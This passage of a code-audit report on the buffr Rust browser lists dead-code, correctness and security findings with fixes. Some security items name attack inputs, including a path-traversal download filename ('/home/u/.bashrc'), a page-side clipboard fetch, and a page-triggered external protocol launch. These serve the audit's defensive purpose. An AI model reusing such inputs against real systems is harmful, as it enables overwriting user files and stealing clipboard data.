- **Problem:** Since Phase 8a nothing pushes into `PermissionsQueue` —
  `BuffrPermissionHandler` uses `enqueue_to_both` (`handlers.rs:1369`, `1427`)
  which writes only to `cef_callback_registry` + the neutral queue, and the
  comment at `handlers.rs:1360` says so. Yet the type, `new_queue`/`queue_len`/
  `pop_front`/`peek_front`/`drain_with_defer` (267-305), the
  `BuffrPermissionHandler.queue` field (`handlers.rs:1304`, never read), the
  `BuffrClient.permissions_queue` field (`handlers.rs:426`), the
  `BrowserHost.permissions_queue` field (`host.rs:205`), the `make_client`
  parameter (`handlers.rs:94`) and the `CefEngineSinks.permissions_queue` field
  (`backend.rs:43`) all still exist. `apps/buffr-app/src/main.rs:1316` calls
  `drain_permissions_with_defer` on a provably-empty queue.
  `drain_registry_with_defer` (`permissions.rs:313`) has zero call sites.
- **Fix:** Delete the type, its five helpers, the four struct fields, and the
  `make_client` parameter.
- **ACTIONABLE:** yes

### L17. Unused CEF factories, stubs, and a duplicated subprocess entry point

- **Category:** yagni
- **Location:** `crates/buffr-cef/src/handlers.rs:157`
- **Problem:** `make_load_handler` (157), `make_display_handler` (176),
  `make_download_handler` (201), `make_find_handler` (213),
  `make_permission_handler` (223) have no call sites — `BuffrClient` constructs
  the handlers inline. `host.rs:1904 record_url` is unused.
  `host.rs:2741 read_media_probe_result` is a documented no-op with no callers.
  `host.rs:2922 fn _hint_used(_: Hint) {}` is a literal placeholder.
  `new_tab.rs:37 settings_html` and its private `html_escape` are unused (the
  apps layer uses `buffr_engine::newtab::default_settings_html`), as are the
  `NewTabHtmlProvider`/`SettingsHtmlProvider` aliases.
  `lib.rs:118 execute_subprocess` and
  `lib.rs:222 execute_process_for_subprocess` have byte-identical bodies under
  two names.
- **Fix:** Delete the unused items; collapse the two subprocess entry points and
  update `apps/buffr-helper/src/main.rs:62` and `backend.rs:93`.
- **ACTIONABLE:** yes

### L18. Dead neutral event/state types in `buffr-engine`

- **Category:** yagni
- **Location:** `crates/buffr-engine/src/event.rs:15`
- **Problem:** Zero references outside `buffr-engine/src`: `EngineEvent`
  (event.rs:15), `NavigationEvent` + `LoadState` (types.rs:59-78),
  `CursorChanged` + `CursorKind` (types.rs:88-116), `TabOptions` (tab.rs:21-30).
  `CursorKind` is actively contradicted by the trait — `take_cursor_change`
  (engine.rs:638) returns a raw `(i32, u32)` and its doc explains why it
  deliberately does _not_ use the neutral type. Because they are `pub` in a
  library crate `dead_code` never fires, so they carry unit tests
  (types.rs:179-224, tab.rs:104-110) that only test themselves.
- **Fix:** Delete `event.rs`, the four types, their tests, and the `pub use`
  lines in `lib.rs:70,87-90`.
- **ACTIONABLE:** needs-decision

### L19. Native-compositing trait trio has no callers and no implementors

- **Category:** yagni
- **Location:** `crates/buffr-engine/src/engine.rs:799`
- **Problem:** `supports_native` (799), `set_native_parent` (833) and
  `set_native_visible` (841) have zero call sites in `apps/` or any backend
  crate, despite a 20-line doc block specifying a four-step protocol the apps
  layer is supposed to follow. `BrowserEngine::set_internal_server` (783) is
  likewise never called — wiring goes through
  `BackendOpenOptions::internal_server` instead.
- **Fix:** Drop the four methods and `NativeRect` until the subsurface work
  lands, or wire the apps layer to actually call them.
- **ACTIONABLE:** needs-decision

### L20. `#[allow(dead_code)]` cluster in the apps layer

- **Category:** yagni
- **Location:** `apps/buffr-app/src/engine_router.rs:75`
- **Problem:** `RouterError::DisallowedScheme` (75-77, doc says "exists for
  future callers"), `EngineRouter::get` (192-195), `AppState::routed_open_tab`
  (`main.rs:2857-2868`) and `routed_open_tab_at` (2887-2902) — both documented
  "currently unused" — `ActiveContextMenu::select_row` (2591-2598), and
  `physical_wheel_to_dip` (9356), which is `#[cfg(test)]`-only yet has three
  dedicated tests (10757-10771) exercising a function no production code calls.
- **Fix:** Delete them; git history preserves them.
- **ACTIONABLE:** yes

### L21. Windowing "cross-platform parity" surface is dead

- **Category:** yagni
- **Location:** `apps/buffr-app/src/windowing/mod.rs:26`
- **Problem:** `mod.rs` declares `mod other; pub use other::*;` unconditionally
  — the second backend the parity shims exist for no longer exists. Zero users
  across `apps/` and `crates/`: `RawWindowHandlePlaceholder` (+ its two
  `unsafe impl Send/Sync`), `TouchEvent`/`TouchId`/`TouchPhase`, `ContentHint`,
  `ActivationError`, `Window::ime()`, `request_close()`, `is_occluded()`,
  `set_activation_token()`, `wl_surface_ptr()`, `SurfaceId::from_raw`.
  `Surface::raw_window_handle` (`window.rs:161-173`) hands back a pointer to the
  internal `Arc<winit::Window>` labelled `wl_surface` with a "must NOT
  dereference" comment. The blanket `#![allow(unused_imports)]` at `mod.rs:20`
  and `other/mod.rs:25` is what keeps this invisible.
- **Fix:** Delete the unused types/methods and the two `allow(unused_imports)`
  so dead re-exports surface as warnings.
- **ACTIONABLE:** yes

### L22. Dead `ScaleFactorChanged` placeholder always yields a 0×0 suggested size

- **Category:** yagni
- **Location:** `apps/buffr-app/src/windowing/other/event_loop.rs:401`
- **Problem:** The chain
  `self.ev.id_map.iter().find(...).map(|(_, _)| ()).and(None::<Size>).unwrap_or_default()`
  iterates the map, throws the result away, and unconditionally produces
  `Size::default()`. `suggested_size` has zero readers anywhere.
- **Fix:** Replace with `Size::default()` and a comment, or drop the field.
- **ACTIONABLE:** yes

### L23. Occlude-sleep debounce is entirely dead

- **Category:** yagni
- **Location:** `apps/buffr-app/src/main.rs:2423`
- **Problem:** `sleep_deadline` is only ever initialised to `None` (2796) and
  set to `None` (8586) — nothing assigns `Some`. The expiry check at 8581-8587
  can never fire, the wake-deadline clamp at 9228-9231 is a no-op, and
  `OCCLUDE_SLEEP_DEBOUNCE` needs `#[allow(dead_code)]` at line 36 to compile.
  `WindowEvent::Occluded` sets `self.occluded` directly (7823), skipping the
  debounce it documents.
- **Fix:** Wire `Occluded(true)` to arm `sleep_deadline` as the doc comment at
  2419-2422 describes, or delete the field, the const, and both dead blocks.
- **ACTIONABLE:** needs-decision

### L24. Dead if/else with identical branches

- **Category:** yagni
- **Location:** `apps/buffr-app/src/main.rs:883`
- **Problem:**
  `let counters_path = if cli.private { paths.data.join("usage-counters.json") } else { paths.data.join("usage-counters.json") };`
  — both arms are byte-identical, so the branch and its comment are noise
  (telemetry is already forced off for private mode at line 882).
- **Fix:** Collapse to the single expression.
- **ACTIONABLE:** yes

### L25. Verbatim duplicate test module

- **Category:** dry
- **Location:** `apps/buffr-app/src/main.rs:11047`
- **Problem:** `mod char_to_vk_tests` (11047-11109) is a copy of the
  `char_to_vk_*` tests already inside `mod virtual_keyboard_tests`
  (10959-11012). The stated rationale ("always compiled — no winit dep") no
  longer holds: `virtual_keyboard_tests` has no cfg gate either.
- **Fix:** Delete `mod char_to_vk_tests`, keeping `resolve_char_unit_from_text`
  in the surviving module.
- **ACTIONABLE:** yes

### L26. `resolve_child_bin`'s `BUFFR_CHILD_BIN` branch is a no-op if/else

- **Category:** yagni
- **Location:** `apps/buffr/src/main.rs:82`
- **Problem:** `if p.is_file() { return Ok(p); } return Ok(p);` — both arms are
  identical, so the `is_file()` check does nothing. It reads as a validation
  step but isn't one.
- **Fix:** Delete the check, or make the non-file case produce the clear error
  the comment promises.
- **ACTIONABLE:** yes

### L27. Debounce rate-limit branch in the config watcher is unreachable

- **Category:** yagni
- **Location:** `crates/buffr-config/src/watcher.rs:107`
- **Problem:** The `if let Some(prev) = last && prev.elapsed() < DEBOUNCE` guard
  can never fire: the drain loop at 95-105 always runs until
  `Instant::now() >= deadline`, i.e. a full `DEBOUNCE` after the triggering
  `recv()`. The `thread::sleep(50ms); continue` body — which would silently
  _drop_ a config change if it ever ran — is dead.
- **Fix:** Delete `last` and the branch.
- **ACTIONABLE:** yes

### L28. Dead `WouldBlock` branch and comments describing behaviour that doesn't exist

- **Category:** yagni
- **Location:** `crates/buffr-engine/src/internal_server.rs:248`
- **Problem:** The listener is explicitly put in blocking mode twice (142, 214),
  so `accept()` can never return `WouldBlock` — the `sleep(50 ms)` arm at
  248-250 is unreachable. The comments at 213 and 219-221 describe a
  non-blocking design the code abandoned, which is what makes M12 possible.
- **Fix:** Pick one model. Non-blocking + poll makes both the branch and the
  comments true and fixes M12.
- **ACTIONABLE:** yes

### L29. Tautological `localhost` branch in `looks_like_url`

- **Category:** correctness
- **Location:** `crates/buffr-config/src/search.rs:158`
- **Problem:** `return port.is_some() || port.is_none();` is unconditionally
  `true`. It reads as if a port constraint is enforced; no input can take the
  `false` path.
- **Fix:** Replace the block with `return true;`.
- **ACTIONABLE:** yes

### L30. `action_to_string` emits notation `parse_action` cannot read back

- **Category:** correctness
- **Location:** `crates/buffr-config/src/keybinding.rs:223`
- **Problem:** `TabReorder { from, to }` (223) and `Engine(id)` (249) produce
  strings `parse_with_args` rejects with `UnknownAction`. The `Serialize` impl
  is documented as producing parseable output for `--print-config`; the
  `round_trip_serialise` test (318) covers four hand-picked variants and misses
  both.
- **Fix:** Add matching arms to `parse_with_args`, or return an explicit
  serialization error for the two non-bindable variants.
- **ACTIONABLE:** yes

### L31. `labels_for` OOM "safety cap" is inoperative for the default alphabet

- **Category:** correctness
- **Location:** `crates/buffr-core/src/hint.rs:194`
- **Problem:** `let cap = alpha_len.saturating_pow(16);` — for the 16-char
  `DEFAULT_HINT_ALPHABET`, `16^16 == 2^64` saturates to `usize::MAX`, so the
  `queue.len() < cap` guard never fires. All callers pass the constant
  `LABEL_BUDGET = 256` today, so it isn't reachable, but the stated invariant
  does not hold for any future page-derived count.
- **Fix:** Use an explicit absolute cap (e.g.
  `const MAX_QUEUE: usize = 1 << 20`).
- **ACTIONABLE:** yes

### L32. Over-long engine badge label draws outside its tab pill

- **Category:** correctness
- **Location:** `crates/buffr-ui/src/tab_strip.rs:290`
- **Problem:** `let label_x = x + (badge_w - label_px) / 2;` where `badge_w` is
  hard-sized for exactly two glyphs (267-268). `TabView::engine_label` is a
  `String` with no length enforcement; a 3+ char label makes the subtraction
  negative so `label_x < x` and the text draws over the previous tab. The
  "2-character" contract lives only in a doc comment (81-83).
- **Fix:** Clamp with `.max(x)`, or truncate the label to 2 chars before
  measuring.
- **ACTIONABLE:** yes

### L33. `buffr-src:` request hangs forever when CEF passes a null callback

- **Category:** correctness
- **Location:** `crates/buffr-cef/src/view_source_scheme.rs:142`
- **Problem:** `open` returns `0` ("pending, wait for `cont()`")
  unconditionally, but `callback_arc` is `None` when CEF hands us a null
  `Callback`. The worker still fetches and fills the body, but nothing ever
  calls `cont()`, so the resource load never completes and the tab spins
  indefinitely.
- **Fix:** When `callback` is `None`, skip the thread and return `1` with
  `*handle_request = 1`.
- **ACTIONABLE:** yes

### L34. Every page console message is logged verbatim at debug level

- **Category:** security
- **Location:** `crates/buffr-cef/src/handlers.rs:953`
- **Problem:** `tracing::debug!(target: "buffr_core::console", %text, …)` logs
  every console line from every frame. Sites routinely log session tokens and
  API responses; with `RUST_LOG=debug` or any file appender that lands on disk —
  including in private mode.
- **Fix:** Drop the blanket log or gate it to `trace` behind an explicit opt-in,
  and truncate/redact non-sentinel messages.
- **ACTIONABLE:** yes

### L35. Missing `Referrer-Policy` on internal-server responses leaks the auth token

- **Category:** security
- **Location:** `crates/buffr-engine/src/internal_server.rs:372`
- **Problem:** The token lives in the URL path (`url_for:181`) and
  `write_response` emits `Cache-Control`/`X-Content-Type-Options`/`Connection`
  but no `Referrer-Policy`. Today `assets/new_tab.html` has no outbound links,
  but the moment any internal page gains an external link or subresource,
  Chromium sends `Referer: http://127.0.0.1:<port>/<token>/new`. No `Host`
  header check is performed either.
- **Fix:** Add `Referrer-Policy: no-referrer`, and reject requests whose `Host`
  is not `127.0.0.1:<port>` / `localhost:<port>`.
- **ACTIONABLE:** yes

### L36. Hint status renders a meaningless `(n/n)` counter

- **Category:** correctness
- **Location:** `crates/buffr-ui/src/lib.rs:316`
- **Problem:** `format_hint` emits
  `format!("{prefix}: {} ({}/{})", h.typed, h.match_count, h.match_count.max(1))`
  — numerator and denominator are the same field, so the statusline always shows
  e.g. `f: as (3/3)`. The test at 767 only checks the prefix and typed text.
- **Fix:** Drop the parenthesised pair, or add a `current` field to
  `HintStatus`.
- **ACTIONABLE:** needs-decision

### L37. `PageMode::Pending` is documented as a live state but is never produced

- **Category:** yagni
- **Location:** `crates/buffr-modal/src/actions.rs:40`
- **Problem:** The doc says `Pending` "surfaces from `Engine::mode()` only while
  a multi-chord prefix is mid-flight", but nothing assigns it — `Engine` only
  mutates `mode` in `set_mode` and `apply_implicit_mode`, neither of which can
  yield `Pending`. Consumers carry unreachable arms
  (`crates/buffr-ui/src/lib.rs:395` renders `"PENDING"`,
  `apps/buffr-app/src/main.rs:7262`), so the statusline can never show the
  indicator it was built for.
- **Fix:** Make `Engine::feed` set `mode = Pending` while `pending` is
  non-empty, or delete the variant and its dead arms.
- **ACTIONABLE:** needs-decision

### L38. Register prefix silently eats a keystroke and is then discarded

- **Category:** yagni
- **Location:** `crates/buffr-modal/src/engine.rs:203`
- **Problem:** `"` sets `awaiting_register_char`, the next chord is stored in
  `self.register`, and `finalise_action` → `reset_pending` (308) clears it
  without attaching it to the emitted `PageAction`. Typing `"ay` swallows two
  keystrokes and produces a plain `YankUrl`.
- **Fix:** Plumb `register` into the emitted action, or remove the `"` handling
  so the chord falls through to the trie.
- **ACTIONABLE:** needs-decision

### L39. Dead public constants and an unused alias/method in `buffr-core`

- **Category:** yagni
- **Location:** `crates/buffr-core/src/updates.rs:35`
- **Problem:** Zero references outside their own definition:
  `DEFAULT_GITHUB_REPO` (updates.rs:35), `DEFAULT_CHECK_INTERVAL_HOURS` (:39),
  `DEFAULT_CHANNEL` (:43), `HINT_OVERLAY_Z_INDEX` (hint.rs:63),
  `HINT_OVERLAY_CLASS` (hint.rs:59), `HintLabel` alias (hint.rs:401),
  `TYPEFLAG_NONE`/`TYPEFLAG_FRAME` (context_menu.rs:17,19),
  `MEDIAFLAG_CONTROLS`/`MEDIAFLAG_PICTURE_IN_PICTURE` (context_menu.rs:39,41).
  `HintSession::esc` (hint.rs:369) takes `&mut self`, mutates nothing,
  unconditionally returns `Cancel`, and is called only from its own tests.
- **Fix:** Delete them.
- **ACTIONABLE:** yes

### L40. Eight `History` constructors for two orthogonal options

- **Category:** yagni
- **Location:** `crates/buffr-history/src/lib.rs:197`
- **Problem:** Lines 197-282 define the full cross-product of two optional
  parameters — ~85 lines of delegation. Only three have non-test callers; adding
  a third option would mean sixteen constructors. No sibling store does this.
- **Fix:** Collapse to `open(path)` / `open_in_memory()` plus an
  `HistoryOptions { clock, skip_schemes }` struct.
- **ACTIONABLE:** needs-decision

### L41. `classify_input` / `InputKind` are dead public API that must be hand-synced

- **Category:** yagni
- **Location:** `crates/buffr-config/src/search.rs:45`
- **Problem:** Re-exported from the crate root (`lib.rs:38`) but the only
  non-test callers anywhere are none. The doc justifies it as "useful for
  telemetry counter wiring", which is speculative — no telemetry sink exists. It
  is also a duplicate decision tree that must be kept in lockstep with
  `resolve_input` by hand (the doc admits "Mirrors the branch order in
  `resolve_input` exactly").
- **Fix:** Delete both, or implement `resolve_input` in terms of
  `classify_input` so the two cannot drift.
- **ACTIONABLE:** needs-decision

### L42. `[theme]` colours and `crash_reporter.purge_after_days` have no validation

- **Category:** correctness
- **Location:** `crates/buffr-config/src/lib.rs:677`
- **Problem:** `validate()` checks leader, hint alphabet, updates, search
  engines, keymap keys, and engines — but not the six `[theme]` hex strings.
  `build_palette` does `parse(&theme.accent).unwrap_or(dflt.accent)`, so
  `accent = "not-a-color"` silently reverts to the built-in blue and
  `--check-config` reports success. Similarly
  `crash_reporter.purge_after_days = 0` validates fine and makes
  `--purge-crashes` delete every report including the one just written, while
  the sibling `updates.check_interval_hours == 0` _is_ rejected (750-755).
- **Fix:** Add a `parse_hex_rgb`-based check for the six theme fields and a
  `> 0` check for `purge_after_days`.
- **ACTIONABLE:** yes

### L43. `deny.toml` ignores an advisory for a crate that isn't in the graph, and misattributes another

- **Category:** correctness
- **Location:** `deny.toml:21`, `deny.toml:22`
- **Problem:** `RUSTSEC-2024-0436` is ignored with the justification "`paste` is
  unmaintained … Transitive via ratatui → hjkl-buffer → buffr-modal". `paste`
  appears **zero** times in `Cargo.lock`. The ignore is dead and now only serves
  to suppress a future real reintroduction without review. Separately the
  quick-xml comment says it is pulled "**only** by wayland-scanner"; the lock
  has two consumers (`wayland-scanner 0.31.10` and `plist 1.9.0` via `cef`), so
  the stated drop condition ("when wayland-scanner moves to quick-xml >= 0.41")
  won't actually clear it. The remaining two ignores
  (`RUSTSEC-2026-0194`/`-0195` for quick-xml, `RUSTSEC-2026-0192` for ttf-parser
  via fontdb/fontdue) still hold.
- **Fix:** Delete the `RUSTSEC-2024-0436` entry; amend the quick-xml comment to
  name both consumers and update the drop condition.
- **ACTIONABLE:** yes

### L44. Three `[workspace.dependencies]` entries are used by nothing

- **Category:** yagni
- **Location:** `Cargo.toml:64`
- **Problem:** `directories = "6"` (64), `flate2 = "1"` (69), and
  `softbuffer = "0.4"` (91-94) are never referenced by any member manifest and
  never appear in any `.rs` file. `softbuffer` was replaced by `wgpu` per the
  workspace's own comment at line 96, yet `docs/accessibility.md:28` still says
  the chrome is "software-rendered via `softbuffer`" and `docs/README.md:26`
  still bills the UI ADR as "why winit + softbuffer for chrome". `directories`
  survives only in doc comments describing path resolution that actually goes
  through `hjkl-config`/`dirs`.
- **Fix:** Delete the three entries; update the two docs to say wgpu.
- **ACTIONABLE:** yes

### L45. `fuzz/Cargo.toml`'s `[patch.crates-io]` table is inert

- **Category:** yagni
- **Location:** `fuzz/Cargo.toml:19`
- **Problem:** The comment claims the patch table is needed because "the patch
  table from the workspace root does NOT apply here". But no `buffr-*` crate is
  published to crates.io, and the two direct deps at 12-13 are already path deps
  whose transitive `buffr-*` deps also resolve by path. Nothing resolves from
  the registry, so all nine entries are unused and cargo emits a "patch … was
  not used" warning for each.
- **Fix:** Delete lines 16-28.
- **ACTIONABLE:** yes

### L46. `docs/updates.md` points at the wrong file and the wrong `ureq` major

- **Category:** docs
- **Location:** `docs/updates.md:83`
- **Problem:** Line 83 attributes the `--check-for-updates` / `--update-status`
  CLI short-circuits to `apps/buffr/src/main.rs`; they live in
  `apps/buffr-app/src/main.rs:455-460` (the supervisor has only three args).
  Lines 87-88 say the network path "uses `ureq` 2.x"; the workspace pins
  `ureq = "3"` and `UreqClient` uses the 3.x `Agent::config_builder()` API.
  Relatedly `docs/accessibility.md:20` and `docs/privacy.md:91` say
  "cef-147"/"libcef-147" while the workspace pins `cef = "148"`.
- **Fix:** Correct the file path, the ureq major, and the two cef references.
- **ACTIONABLE:** yes

---

## `buffr-webkit` (excluded from the workspace, not built by CI)

`cargo check --manifest-path crates/buffr-webkit/Cargo.toml` would plausibly
succeed — every `buffr-engine`/`buffr-core`/`buffr-modal` API it names still
exists and the `BrowserEngine` impl covers all non-defaulted methods — but
`cargo clippy -- -D warnings` would fail (identity `mem::transmute::<T,T>` at
`runtime.rs:1397`, `map_or(false, …)` at `runtime.rs:3463`, many
`collapsible_if`). Severity is capped at medium below because none of this
ships.

The right structural fix is to wire the crate into CI (`cargo check` + `clippy`
on a Linux runner with `wpewebkit`), since none of the drift below is detectable
today.

### W1. `internal_server` is dropped on the floor — every `buffr://` navigation fails

- **Severity:** medium · **Category:** bitrot
- **Location:** `crates/buffr-webkit/src/platform/backend.rs:43`
- **Problem:** `open_engine` calls `WebKitEngine::new(&options)` (=
  `new_with_server(options, None)`) and never reads `options.internal_server`,
  which `buffr-cef` does pass (`crates/buffr-cef/src/backend.rs:173`). The
  recovery path is also broken: `set_internal_server` at `engine.rs:334` is an
  _inherent_ method, not an override of `BrowserEngine::set_internal_server`, so
  a call through `Arc<dyn BrowserEngine>` silently hits the trait's default
  no-op. `resolve_url` therefore returns the raw `buffr://new`, WebKit has no
  handler for that scheme, and the first tab fails to load.
- **Fix:** Pass `options.internal_server.clone()` into `new_with_server` and add
  a real trait override.
- **ACTIONABLE:** yes

### W2. Any web page can read the host clipboard via `fetch('buffr-clipboard:read')`

- **Severity:** medium · **Category:** security
- **Location:** `crates/buffr-webkit/src/platform/runtime.rs:3599`
- **Problem:** The `buffr-clipboard` scheme is registered process-wide and
  explicitly marked CORS-enabled _and_ secure ("so fetch() from any origin works
  without preflight"). The handler returns the full system clipboard as
  `text/plain` with no origin check, no user gesture, and no permission prompt.
- **Fix:** Don't register it CORS-enabled; gate reads on a recent user gesture
  tracked on the Rust side, or replace the scheme with a UCM `postMessage`
  round-trip answered only while an edit-mode paste is in flight.
- **ACTIONABLE:** needs-decision

### W3. Out-of-bounds read in the OSR frame ingest loop

- **Severity:** medium · **Category:** correctness
- **Location:** `crates/buffr-webkit/src/platform/wpe_subclass.rs:332`
- **Problem:** `src_stride = size_us.div_ceil(h)` infers a stride from the
  _total_ size, then the loop at 389 reads
  `data_ptr.add(row * src_stride) .. + row_bytes` per row. The only guard is
  `src_stride < row_bytes`; nothing checks
  `(h-1)*src_stride + row_bytes <= size_us`. With `w=100`, `h=1000`,
  `size_us=400_001`, `div_ceil` yields 401 and the last row reads ~600 bytes
  past the end of the GBytes.
- **Fix:** Bail unless
  `(h-1).saturating_mul(src_stride) + row_bytes <= size_us`; better, get the
  real stride from WPE.
- **ACTIONABLE:** yes

### W4. Keyboard modifiers reach WPE untranslated — Ctrl arrives as Alt

- **Severity:** medium · **Category:** correctness
- **Location:** `crates/buffr-webkit/src/platform/worker.rs:718`
- **Problem:** `Command::KeyEvent` forwards `ev.modifiers` verbatim while every
  mouse arm (721/730/739) runs it through `translate_modifiers`.
  `NeutralKeyEvent::modifiers` is a CEF `EVENTFLAG_*` mask
  (`crates/buffr-engine/src/input.rs:38`): CEF CONTROL=0x04 lands as WPE alt(4)
  and CEF ALT=0x08 as WPE meta(8). Ctrl+A in a textarea is delivered as Alt+A.
- **Fix:** `translate_modifiers(ev.modifiers)`.
- **ACTIONABLE:** yes

### W5. Download destination is built from an unsanitized server-supplied filename

- **Severity:** medium · **Category:** security
- **Location:** `crates/buffr-webkit/src/platform/worker.rs:1005`
- **Problem:** `suggested` comes from
  `webkit_uri_response_get_suggested_filename` (the site's
  `Content-Disposition`) or the last URL path segment, and is passed to
  `dir.join(&suggested)` with no basename or traversal check. `Path::join` with
  an absolute component _discards_ `dir` entirely, so
  `filename="/home/u/.bashrc"` points the destination outside `~/Downloads`;
  `..` escapes it too.
- **Fix:** Reduce to `Path::new(&suggested).file_name()`, reject empty/`.`/`..`,
  and re-verify the joined path still starts with the download dir.
- **ACTIONABLE:** yes

### W6. Display-URL override is never cleared — omnibar shows a stale URL after any link click

- **Severity:** medium · **Category:** correctness
- **Location:** `crates/buffr-webkit/src/platform/engine.rs:689`
- **Problem:** `navigate` records the typed URL for _every_ scheme and
  `apply_display_overrides_pure` (497) unconditionally replaces `summary.url`
  with it; the entry is only removed on tab close. `buffr-cef` records only
  `buffr://`/`buffr-src:` and calls `forget_display_url` otherwise
  (`crates/buffr-cef/src/host.rs:1436`, `:1961`). Repro: navigate to
  `https://example.com`, click through to `/foo` — the omnibar still reports
  `https://example.com` forever.
- **Fix:** Mirror CEF's record/forget policy.
- **ACTIONABLE:** yes

### W7. `options.private` is ignored — private mode still writes a persistent cookie DB

- **Severity:** medium · **Category:** correctness
- **Location:** `crates/buffr-webkit/src/platform/engine.rs:216`
- **Problem:** `new_with_server` never reads `options.private`; it always
  computes a cookie path and `worker.rs:527` unconditionally enables the SQLite
  persistent store. `TabInfo::to_summary` also hardcodes `private: false`
  (`runtime.rs:100`). `apps/buffr-poc/src/main.rs:249` passes `private: true`
  with `data_dir: None`, so the "private" POC writes cookies to the real
  `$XDG_DATA_HOME/buffr/engines/webkit/cookies.sqlite`.
- **Fix:** Skip `webkit_cookie_manager_set_persistent_storage` when `private`,
  thread the flag into `EngineState`/`TabInfo`, and report it in `TabSummary`.
- **ACTIONABLE:** yes

### W8. Renderer-controlled URIs handed to `xdg-open` with no prompt, leaking zombies

- **Severity:** medium · **Category:** security
- **Location:** `crates/buffr-webkit/src/platform/runtime.rs:1858`
- **Problem:** Any scheme outside `INTERNAL_SCHEMES` is launched via `xdg-open`
  straight from the policy handler — a page doing `location = 'foo://…'` on load
  launches the user's handler for `foo:` with no gesture and no confirmation
  (Chromium prompts for external protocols). Separately
  `let _ = Command::spawn()` drops the `Child` without waiting, leaving a zombie
  per launch.
- **Fix:** Require a user-initiated navigation and confirm before launching;
  reap the child.
- **ACTIONABLE:** needs-decision

### W9. Downloads sink downcast can never match

- **Severity:** low · **Category:** correctness
- **Location:** `crates/buffr-webkit/src/platform/engine.rs:226`
- **Problem:** `options.downloads` is `Option<Arc<dyn Any + Send + Sync>>`;
  `any.downcast_ref::<Arc<Downloads>>()` auto-derefs to `dyn Any` and therefore
  only succeeds if the caller erased an `Arc<Arc<Downloads>>`. A caller passing
  the natural `Arc<Downloads>` gets `None`, so `download-started` is never wired
  and every download is invisible to the store — with no log line saying so.
- **Fix:** `downcast_ref::<Downloads>()` on the deref'd value; `warn!` when a
  non-`None` sink fails to downcast.
- **ACTIONABLE:** yes

### W10. Three clipboard stacks instantiated per engine

- **Severity:** low · **Category:** dry
- **Location:** `crates/buffr-webkit/src/platform/runtime.rs:2383`
- **Problem:** A `Clipboard` is created per tab (`runtime.rs:2383`), per
  `buffr-clipboard:read` request (`runtime.rs:1347`), and once per engine
  (`clipboard.rs:29`) — each opening its own Wayland connection. Compounded by
  the version divergence in L15.
- **Fix:** Share one `Arc<Clipboard>` across all three.
- **ACTIONABLE:** yes
